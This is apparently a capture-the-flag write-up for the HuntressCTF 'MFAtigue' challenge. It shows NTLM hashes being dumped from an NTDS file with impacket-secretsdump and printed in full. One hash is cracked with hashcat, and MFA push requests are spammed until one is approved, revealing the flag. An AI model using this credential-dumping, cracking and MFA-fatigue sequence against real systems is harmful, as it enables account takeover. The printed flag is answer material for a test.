---
title: 2023 HuntressCTF - MFAtigue
date: 2023-11-01T07:00:00-07:00
tags:
  - mfa
  - ntds
  - hash
  - impacket-secretsdump
image: /2023-HuntressCTF/mfa.png
---

### Summary
```
Author: Adam Rice

We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...
```

### Steps

This challenge we given a `NTDS.zip` file and a docker instance to connect to.  I extracted the file and confirmed with `file` that its a Windows registry file.  Next I used `impacket-secretsdump` to dump the hashes from the .dits file. 
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM local -outputfile ./results.txt
```

This tool was able to extract the hash for multiple users.
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ffcddea58170b42267fa689f0fa119:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-UUTKPJ98ERD$:1000:aad3b435b51404eeaad3b435b51404ee:ef38fd14274db386b7b5bbddcb37f953:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:948e12fcf27797f773c901c7e1b069d8:::
huntressctf.local\PAMELA_MCCARTHY:1103:aad3b435b51404eeaad3b435b51404ee:98574cb0badfc5d11094dd239af97da2:::
huntressctf.local\MATHEW_BERG:1104:aad3b435b51404eeaad3b435b51404ee:c7e3f4aa78cb46c0b47e61809cef8ca8:::
huntressctf.local\ETHAN_WELCH:1105:aad3b435b51404eeaad3b435b51404ee:151cb8e8e6b942bb0495e88c02365c19:::
huntressctf.local\RILEY_LANGLEY:1106:aad3b435b51404eeaad3b435b51404ee:565911c8b1e206319277f50207377fb1:::
huntressctf.local\PASQUALE_CHRISTIAN:1107:aad3b435b51404eeaad3b435b51404ee:7a2c60c628bda5d963a5934ec733f85f:::
huntressctf.local\HELENA_HESS:1108:aad3b435b51404eeaad3b435b51404ee:feb58b0c807bc1ef3adc390dabc1f6ac:::
huntressctf.local\SALLIE_BALLARD:1109:aad3b435b51404eeaad3b435b51404ee:e7c417bd62f442b1ee53bf70c8d656ef:::
huntressctf.local\LOU_NAVARRO:1110:aad3b435b51404eeaad3b435b51404ee:189b758028dc7ea177e26b990f09aad0:::
huntressctf.local\EDGARDO_DOWNS:1111:aad3b435b51404eeaad3b435b51404ee:38170f23f241863a09d07b2f438fe35a:::
huntressctf.local\GENE_SAWYER:1112:aad3b435b51404eeaad3b435b51404ee:3f8aa43a8714b6cba6438ab8e2890576:::
huntressctf.local\JILLIAN_DOTSON:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::
huntressctf.local\EILEEN_NGUYEN:1114:aad3b435b51404eeaad3b435b51404ee:a03d6125a5d27301c10657d20bcb11f0:::
huntressctf.local\8385424457SA:1115:aad3b435b51404eeaad3b435b51404ee:a41edb7e4b7e68bb594d42de289ef4e2:::
huntressctf.local\BERTIE_PRINCE:1116:aad3b435b51404eeaad3b435b51404ee:eb0694cb60d647825ebc6420e0b4f4d4:::
huntressctf.local\KIRK_BARKER:1117:aad3b435b51404eeaad3b435b51404ee:04f60aa2def14e3a0703480d46a74b5c:::
huntressctf.local\PHOEBE_LEWIS:1118:aad3b435b51404eeaad3b435b51404ee:9bc8530fb646ed162646f50dab5ca44a:::
huntressctf.local\LILY_DUNLAP:1119:aad3b435b51404eeaad3b435b51404ee:ab69b9f2f7db11b28dde05ef92961335:::
```

Next, I passed this file to hashcat to try to crack the hashes using the following: `hashcat -m 1000 results.txt.ntds /usr/share/wordlists/rockyou.txt --force`.

Hashcat was able to find crack the hash for one user:
```bash
huntressctf.local\JILLIAN_DOTSON:katlyn99
```

I started up the docker instance and attempted to login with the newly discovered credentials.

![](/2023-HuntressCTF/mfa2.png)

I confirmed the credentials work as I was presented with a `Send Push Notification`.  Based on the challenge title `MFAtigue`, I decided to spam the Send Push Notification button, hoping the user would be annoyed and approve one of the requests. 

After a few attempts, I was presented with the flag: `flag{9b896a677de35d7dfa715a05c25ef89e}`

![](/2023-HuntressCTF/mfa3.png)